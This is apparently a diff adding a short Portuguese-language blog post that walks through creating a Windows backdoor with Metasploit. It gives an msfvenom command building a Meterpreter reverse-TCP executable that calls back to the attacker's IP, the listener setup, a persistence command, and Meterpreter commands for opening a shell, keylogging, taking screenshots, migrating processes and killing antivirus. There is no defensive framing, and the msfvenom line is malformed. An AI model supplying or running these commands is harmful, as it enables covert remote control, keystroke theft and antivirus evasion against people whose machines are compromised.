@@ -1,0 +1,60 @@
+---
+layout: post
+title: Criando BackDoor no Windowns
+date: 2016-07-11T12:16:44.000Z
+---
+<img src='/images/fulls/backdoor-01.jpg'>
+
+-Comandos para criar a backdoor:
+#msfvenom -p windows/meterpreter/reverse_tcp 192.168.0.104LHOST=(SeuIP) LPORT=443 -f exe > /root/Desktop/shell.exe 
+
+-Comandos para configurar o modo Listening:
+#msfconsole
+#use exploit/multi/handler
+#set payload windows/meterpreter/reverse_tcp
+#set lhost (Seu IP)
+#set lport 443
+
+exploit
+
+-Comando manutenção de acesso:
+
+#run persistence -A -X -i 60 -p 443 -f (Seu IP)
+
+Comandos do  meterpreter pra brinca 
+
+Para obter ajuda das funções do Meterpreter.
+meterpreter > help 
+
+Para finalizar a sessão e sair do Meterpreter.
+meterpreter > exit
+
+Ás vezes sera necessauro manter a sessão ativa do Meterpreter  para outras finalidades ,para usar um modulo auxiliar por exemplo.
+metrpreter > background
+
+Migrar para outro processo:
+meterpreter > run migrate -f
+
+Obter shel.
+meterpreter > shell
+
+Executar um arquivo .
+execute -f calc.exe
+
+Keylogger.
+
+meterpreter > keyscan_start INICIA O KEYLOGGER
+meterpreter > keyscan_dump EXIBE AS TECLAS DIGITADAS
+meterpreter > keyscan_stop FINALIZA O KEYLOGGER
+
+Captura de tela.
+
+meterpreter > screenshot
+
+Finalizar processo de antivirus.
+
+meterpreter > run killav
+
+<a href="https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/">Mais comandos.</a>
+
+
